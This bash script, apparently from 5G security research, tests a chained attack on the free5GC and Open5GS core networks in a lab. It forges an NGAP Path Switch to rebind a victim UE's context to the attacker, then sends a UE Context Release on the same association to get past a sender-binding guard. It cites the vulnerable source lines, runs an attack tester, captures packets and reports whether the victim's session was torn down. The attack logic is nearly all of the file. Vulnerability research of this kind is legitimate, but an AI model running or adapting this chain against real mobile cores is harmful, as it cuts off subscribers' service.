#!/usr/bin/env bash
# ==========================================================================
# STRICT test of the CHAINED attack:  Path Switch  ->  UE Context Release
#   "Path Switch as a binding-acquisition primitive"
# ==========================================================================
#
# WHAT WE ARE TESTING
# -------------------
# free5GC and Open5GS BLOCK a standalone forged UEContextReleaseRequest with a
# sender-binding guard:
#     Open5GS  ngap-handler.c:1784   if (ran_ue->gnb_id != gnb->id) -> reject
#     free5GC  handler.go:2333       if ranUe.Ran != ran           -> reject
# BUT a successful Path Switch REBINDS the victim's context to the sender:
#     Open5GS  ran_ue_switch_to_gnb  ran_ue->gnb_id = attacker  (context.c:1460)
#     free5GC  SwitchToRan           ranUe.Ran      = attacker  (ran_ue.go:117)
# So AFTER a Path Switch on the SAME SCTP association, the guard points at the
# attacker, and a follow-up release on that same association should now PASS.
#
# HYPOTHESIS  (what a PASS proves)
#   H-control : a STANDALONE release for the victim is REJECTED (guard works).
#   H-chain   : PathSwitch-then-release on ONE association is ACCEPTED (guard
#               bypassed) -> the AMF actually processes the release.
#   CHAIN CONFIRMED  <=>  H-control rejected  AND  H-chain accepted.
#
# The discriminator is the AMF's HANDLING OF THE RELEASE (accepted vs rejected),
# NOT merely "victim ping drops" -- because on free5GC the Path Switch alone
# already redirects downlink, so ping loss is not sufficient attribution.
# Both messages MUST ride one association -> we use the tester's single-command
# `chain-ps-release` (NG Setup once, then path-switch + ue-release on that conn).
#
# USAGE:   ./verify_chain_pathswitch_then_release.sh [free5gc|open5gs]   (default free5gc)
# Requires the chosen core + UERANSIM up on net-5glab, Docker, the ngap-tester
# image. Run from ngap_tester/. Git Bash / bash.
set -uo pipefail
cd "$(dirname "$0")"

CORE="${1:-free5gc}"
case "$CORE" in
  free5gc)
    AMF=f5gc-amf; SMF=f5gc-smf
    GNB=ueransim-free5gc-ueransim-gnb-1; UE=ueransim-free5gc-ueransim-ue-1
    VIDRE='AU:[0-9]+'                       # free5GC logs AMF-UE-NGAP-ID as AU:<n>
    REJECT='is not in Ran|Unknown.*UENGAPID|not in Ran'
    # Do NOT match "Handle UEContextReleaseRequest" — free5GC logs that even on reject.
    ACCEPT='Send UE Context Release Command|Release Ue Context'
    ;;
  open5gs)
    AMF=o5gs-amf; SMF=o5gs-smf
    GNB=ueransim-open5gs-ueransim-gnb-1; UE=ueransim-open5gs-ueransim-ue-1
    VIDRE='AMF_UE_NGAP_ID\[[0-9]+\]'
    REJECT='does not belong'
    ACCEPT='UEContextReleaseCommand|sending UEContextReleaseCommand'
    ;;
  *) echo "usage: $0 [free5gc|open5gs]"; exit 1;;
esac
NET=net-5glab; CFG="$CORE"; PING_IF=uesimtun0; POST=30
DIR="chain_${CORE}_pathswitch_then_release"
ABS="$(pwd)/pcap/$DIR"; mkdir -p "$ABS"

log(){ echo -e "\033[1;35m[chain:$CORE]\033[0m $*"; }
die(){ echo -e "\033[1;31m[chain][ABORT]\033[0m $*"; exit 2; }
num(){ [[ "$1" =~ ^[0-9]+$ ]] && echo "$1" || echo "-1"; }
tsh(){ MSYS_NO_PATHCONV=1 docker run --rm -v "$ABS:/cap" nicolaka/netshoot tshark "$@" 2>/dev/null; }
fire(){ # run the tester with given args on a fresh association
  MSYS_NO_PATHCONV=1 docker run --rm --network "$NET" -v "$ABS:/evidence" ngap-tester \
    --config "config/$CFG.json" --evidence /evidence/attack.jsonl "$@" 2>&1 | sed 's/^/    /'; }
amf_lines(){ docker logs "$AMF" 2>&1 | wc -l | tr -d ' '; }
amf_since(){ docker logs "$AMF" 2>&1 | tail -n +$(( $1 + 1 )); }
victim_id(){ docker logs "$AMF" 2>&1 | grep -oE "$VIDRE" | tail -1 | grep -oE '[0-9]+'; }
ping_loss(){ docker exec "$UE" ping -I "$PING_IF" -c "${1:-5}" -i "${2:-1}" -W 2 8.8.8.8 2>/dev/null \
             | grep -oE '[0-9]+% packet loss' | grep -oE '^[0-9]+' | tail -1; }

# 0. core + RAN up, fresh ACTIVE victim ----------------------------------
log "ensuring $CORE + RAN up ..."
( cd ../5g-lab && ./scripts/core.sh up "$CORE" && ./scripts/ran.sh up ueransim "$CORE" ) || true
log "restarting victim UE for a fresh registration ..."
docker restart "$UE" >/dev/null || die "cannot restart UE '$UE'"
sleep 13
BASE=$(num "$(ping_loss 5 1)")
log "baseline packet loss: ${BASE}%"
{ [ "$BASE" -lt 0 ] || [ "$BASE" -ge 60 ]; } && die "victim not active (baseline ${BASE}%). Fix UE/PDU session first."
V=$(victim_id); [ -z "${V:-}" ] && die "cannot read victim AMF-UE-NGAP-ID"
log "victim AMF-UE-NGAP-ID = $V"

# ========================================================================
# PHASE A -- CONTROL: standalone release must be REJECTED by the guard
# ========================================================================
log "PHASE A (control): firing a STANDALONE UEContextReleaseRequest (expect REJECT) ..."
MARK=$(amf_lines)
fire ue-release --amf-ue-id "$V" --ran-ue-id 99
sleep 3
A_LOG=$(amf_since "$MARK")
A_REJECT=$(echo "$A_LOG" | grep -cE "$REJECT")
A_ACCEPT=$(echo "$A_LOG" | grep -cE "$ACCEPT")
A_PING=$(num "$(ping_loss 5 1)")
echo "$A_LOG" | grep -iE "$REJECT|$ACCEPT|ErrorIndication|Release" | tail -6 | sed 's/^/    [amfA] /'
log "PHASE A result: reject-markers=$A_REJECT  accept-markers=$A_ACCEPT  victim-loss=${A_PING}%"

# ========================================================================
# PHASE B -- CHAIN: Path Switch THEN release on ONE association (expect ACCEPT)
# ========================================================================
log "PHASE B (chain): capturing + firing chain-ps-release (expect release ACCEPTED) ..."
MARK=$(amf_lines)
# continuous ping across the window (attribution: see header note)
docker exec "$UE" ping -I "$PING_IF" -c 70 -i 0.5 -W 2 8.8.8.8 >/tmp/chain_ping.log 2>&1 &
PING_PID=$!; trap 'kill $PING_PID 2>/dev/null' EXIT
CFG_CORE="$CFG" ./capture_attack.sh "$DIR" "$AMF" "$SMF" "$GNB" "$NET" "$POST" \
    -- chain-ps-release --source-amf-ue-id "$V" --ran-ue-id 99
wait $PING_PID 2>/dev/null; trap - EXIT
B_LOG=$(amf_since "$MARK")
B_REJECT=$(echo "$B_LOG" | grep -cE "$REJECT")
B_ACCEPT=$(echo "$B_LOG" | grep -cE "$ACCEPT")
B_PING=$(num "$(grep -oE '[0-9]+% packet loss' /tmp/chain_ping.log | grep -oE '^[0-9]+' | tail -1)")
PS_ACK=$(tsh -r /cap/amf_ngap_nas_sbi.pcap -Y "ngap.procedureCode==25" -T fields -e frame.number | grep -c .)
REL_41=$(tsh -r /cap/amf_ngap_nas_sbi.pcap -Y "ngap.procedureCode==41" -T fields -e frame.number | grep -c .)
PFCP_MOD=$(tsh -r /cap/amf_ngap_nas_sbi.pcap -Y "pfcp.msg_type==54 or pfcp.msg_type==56" -T fields -e frame.number | grep -c .)
if [ -f "$ABS/smf_sbi_pfcp.pcap" ]; then
  PFCP_MOD=$(( PFCP_MOD + $(tsh -r /cap/smf_sbi_pfcp.pcap -Y "pfcp.msg_type==54 or pfcp.msg_type==56" -T fields -e frame.number | grep -c .) ))
fi
echo "$B_LOG" | grep -iE "$REJECT|$ACCEPT|Switch to new Ran|ErrorIndication|Release|deactivate" | tail -8 | sed 's/^/    [amfB] /'
log "PHASE B result: reject=$B_REJECT accept=$B_ACCEPT  PathSwitchACK=$PS_ACK  NGAP41=$REL_41  PFCP-mod/del=$PFCP_MOD  victim-loss=${B_PING}%"

# ========================================================================
# VERDICT
# ========================================================================
echo   "----------------------------------------------------------------"
echo   "  CHAIN Path Switch -> Release   ($CORE)   victim AMF-UE-NGAP-ID=$V"
echo   "  PHASE A (standalone release) : reject=$A_REJECT accept=$A_ACCEPT loss=${A_PING}%   (want: REJECTED)"
echo   "  PHASE B (chain)              : PS-ACK=$PS_ACK accept=$B_ACCEPT reject=$B_REJECT NGAP41=$REL_41 PFCP=$PFCP_MOD loss=${B_PING}%"
CTRL_OK=0;  if [ "$A_REJECT" -ge 1 ] && [ "$A_ACCEPT" -eq 0 ]; then CTRL_OK=1; fi
CHAIN_OK=0; if [ "$B_ACCEPT" -ge 1 ] || [ "$REL_41" -ge 1 ] || [ "$PFCP_MOD" -ge 1 ]; then CHAIN_OK=1; fi
if [ "$CTRL_OK" -eq 1 ] && [ "$CHAIN_OK" -eq 1 ]; then
  echo "  VERDICT: CHAIN CONFIRMED — standalone release blocked, but Path-Switch-then-release ACCEPTED (binding guard bypassed)."
elif [ "$CTRL_OK" -eq 0 ]; then
  echo "  VERDICT: INVALID CONTROL — standalone release was NOT cleanly rejected; can't attribute the chain. Inspect PHASE A log."
elif [ "$PS_ACK" -eq 0 ]; then
  echo "  VERDICT: FAIL — Path Switch itself did not ACK (no rebind), so the chain premise never held. Check victim has an active PDU session."
else
  echo "  VERDICT: FAIL — Path Switch rebound but the follow-up release was still not accepted. Guard held; hypothesis not supported on $CORE."
fi
echo   "  evidence: pcap/$DIR/  (+ attack.jsonl)"
echo   "----------------------------------------------------------------"
